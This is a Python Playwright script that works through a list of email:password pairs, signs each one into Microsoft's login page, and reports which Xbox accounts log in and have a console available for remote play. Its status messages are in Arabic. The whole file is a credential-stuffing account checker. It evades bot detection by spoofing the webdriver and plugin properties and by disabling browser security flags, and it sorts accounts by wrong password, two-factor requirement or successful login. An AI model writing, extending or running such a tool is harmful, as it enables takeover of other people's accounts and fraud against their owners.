import asyncio
from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeoutError
from typing import Dict, List, Tuple
from datetime import datetime

# Timeouts (milliseconds)
TIMEOUT_VAL = 60000
NAVIGATION_TIMEOUT = 45000

async def check_console_availability(page) -> Tuple[bool, str]:
    """
    After successful login, navigate to consoles page and check for remote play availability.
    Returns (has_console, info_message)
    """
    url = "https://www.xbox.com/en-US/play/consoles"
    try:
        await page.goto(url, timeout=NAVIGATION_TIMEOUT, wait_until="networkidle")
        # Wait for the main container to load
        await page.wait_for_selector("body", timeout=10000)
        await asyncio.sleep(3)  # extra buffer for dynamic content

        # Try to find console elements
        # Option 1: look for "Play remotely" button or console list
        remote_play_btn = page.locator("button:has-text('Play remotely')")
        console_card = page.locator("[data-testid='console-card']")
        no_console_msg = page.locator("text=No consoles found")

        if await remote_play_btn.count() > 0 or await console_card.count() > 0:
            return True, "يوجد جهاز (جاهز للتشغيل عن بعد)"
        
        if await no_console_msg.count() > 0:
            return False, "مسجل ولا يوجد جهاز"

        # Fallback: check page text
        body_text = (await page.inner_text("body")).lower()
        if any(phrase in body_text for phrase in ["play your console remotely", "start remote play", "your consoles"]):
            return True, "يوجد جهاز"
        if any(phrase in body_text for phrase in ["set up your console", "no consoles found", "add a console"]):
            return False, "مسجل ولا يوجد جهاز"
        
        return False, "تم تسجيل الدخول ولكن لم يتم الكشف عن جهاز (تحقق يدويًا)"
    
    except Exception as e:
        return False, f"خطأ في فحص الجهاز: {str(e)[:60]}"


async def process_account(account: Dict, headless: bool = True) -> Dict:
    result = {
        'email': account['email'],
        'password': account['password'],
        'success': False,
        'has_console': False,
        'console_info': '',
        'timestamp': datetime.now().isoformat()
    }
    p = None
    try:
        p = await async_playwright().start()
        # Stealth settings to avoid detection
        browser = await p.chromium.launch(
            headless=headless,
            args=[
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-blink-features=AutomationControlled',
                '--disable-web-security',
                '--disable-features=IsolateOrigins,site-per-process'
            ]
        )
        # Modern user agent (Edge on Windows)
        modern_ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
        context = await browser.new_context(
            user_agent=modern_ua,
            viewport={'width': 1280, 'height': 720},
            locale='en-US',
            timezone_id='America/New_York'
        )
        # Hide playwright automation
        await context.add_init_script("""
            Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
            Object.defineProperty(navigator, 'plugins', {get: () => [1,2,3,4,5]});
            window.chrome = { runtime: {} };
        """)
        
        page = await context.new_page()
        page.set_default_timeout(TIMEOUT_VAL)

        # Start login process
        login_url = "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=15&ct={}&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2fwww.xbox.com%2fen-US%2fplay%2fconsoles".format(int(datetime.now().timestamp()))
        await page.goto(login_url, wait_until="domcontentloaded")
        
        # Step 1: Enter email
        email_input = page.locator("input[name='loginfmt']")
        await email_input.wait_for(state="visible", timeout=20000)
        await email_input.fill(account['email'])
        await page.locator("input[type='submit'][value='Next'], #idSIButton9").click()
        await page.wait_for_load_state("networkidle")
        await asyncio.sleep(2)
        
        # Step 2: Handle potential passkey / other options
        # Check if we are on password page
        password_input = page.locator("input[name='passwd']")
        passkey_button = page.locator("text=Use a passkey")
        other_options = page.locator("text=Other ways to sign in")
        
        # If passkey screen appears, click "Use a password" or "Other ways"
        if await passkey_button.count() > 0:
            # Click on "Other ways" then select password
            await other_options.click()
            await asyncio.sleep(1)
            use_password = page.locator("text=Use a password")
            if await use_password.count() > 0:
                await use_password.click()
                await asyncio.sleep(2)
            # Now wait for password field again
            await password_input.wait_for(state="visible", timeout=10000)
        
        # If still not visible, try direct fallback: reload with ?mssignup=1
        if await password_input.count() == 0:
            # Force password flow by adding query param
            current_url = page.url
            if "mssignup" not in current_url:
                new_url = current_url + "&mssignup=1" if "?" in current_url else current_url + "?mssignup=1"
                await page.goto(new_url, wait_until="domcontentloaded")
                await asyncio.sleep(2)
                await password_input.wait_for(state="visible", timeout=10000)
        
        # Step 3: Enter password
        await password_input.fill(account['password'])
        await page.locator("input[type='submit'][value='Sign in'], #idSIButton9").click()
        await page.wait_for_load_state("networkidle")
        await asyncio.sleep(3)
        
        # Step 4: Handle "Stay signed in?" prompt
        stay_btn = page.locator("input[value='Yes'], #idSIButton9")
        if await stay_btn.is_visible(timeout=5000):
            await stay_btn.click()
            await page.wait_for_load_state("networkidle")
            await asyncio.sleep(2)
        
        # Step 5: Check if login actually succeeded (redirect to xbox.com)
        if "login.live.com" in page.url or "error" in page.url.lower():
            # Check for 2FA or error message
            error_text = await page.inner_text("body")
            if "two-factor" in error_text.lower() or "authenticator" in error_text.lower():
                result['console_info'] = "يتطلب تحقق بخطوتين (2FA)"
                result['success'] = False
            elif "incorrect" in error_text.lower() or "password" in error_text.lower():
                result['console_info'] = "كلمة مرور خاطئة"
                result['success'] = False
            else:
                result['console_info'] = "فشل تسجيل الدخول (قد يتطلب تحقق)"
                result['success'] = False
            await browser.close()
            await p.stop()
            return result
        
        # Step 6: Login successful - now check for consoles
        result['success'] = True
        has_console, console_info = await check_console_availability(page)
        result['has_console'] = has_console
        result['console_info'] = console_info
        
        await browser.close()
        await p.stop()
        
    except PlaywrightTimeoutError as e:
        result['console_info'] = f"انتهاء المهلة: {str(e)[:40]}"
        result['success'] = False
        if p:
            await p.stop()
    except Exception as e:
        result['console_info'] = f"خطأ عام: {str(e)[:60]}"
        result['success'] = False
        if p:
            await p.stop()
    
    return result


def parse_accounts_from_text(content: str) -> List[Dict]:
    accounts = []
    for line in content.splitlines():
        line = line.strip()
        if ':' in line and not line.startswith('#'):
            parts = line.split(':', 1)
            if len(parts) == 2:
                accounts.append({'email': parts[0].strip(), 'password': parts[1].strip()})
    return accounts
